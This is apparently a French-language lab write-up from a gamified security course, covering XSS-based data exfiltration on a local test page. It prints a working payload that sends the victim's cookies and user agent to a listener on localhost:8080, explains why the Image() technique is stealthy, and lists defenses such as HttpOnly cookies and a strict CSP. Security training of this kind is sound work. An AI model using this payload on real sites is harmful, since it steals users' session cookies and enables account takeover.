# 🧪 Mission 3.4 – XSS avec exfiltration de données

## 🎯 Objectif
Utiliser une faille XSS pour exfiltrer discrètement des données du navigateur de la victime vers un serveur distant contrôlé.

---

## 🔍 Contexte
- Page locale vulnérable (`xss-lab.html`)
- Insertion d’un script via `document.write` ou injection directe
- Le script envoie les données vers un serveur Python local

---

## 💉 Payload utilisé

```html
<script>
  new Image().src = "http://localhost:8080/?cookie=" + document.cookie + "&ua=" + navigator.userAgent;
</script>

📋 Données exfiltrées
userAgent du navigateur

Cookie (vide ici, mais fonctionnel si présent)

🌐 Serveur utilisé
Script Python local (exfil-server.py)

Écoute sur le port 8080 via BaseHTTPRequestHandler

🧠 Analyse technique
Image() est une méthode discrète : ne génère aucune alerte visible

Le navigateur déclenche une requête GET automatique vers l’URL cible

Les données de la victime sont incluses dans l’URL → réception côté serveur

🛡️ Défenses recommandées
Ne jamais autoriser d’injection directe dans le DOM (innerHTML)

Marquer les cookies sensibles avec HttpOnly → inaccessibles via JS

Appliquer une Content-Security-Policy (CSP) stricte :

http
Copier
Modifier
Content-Security-Policy: default-src 'self'; script-src 'self'
🏅 Badge obtenu
🎖️ Data Leaker

"Tu ne montres plus les failles… tu les exploites discrètement."

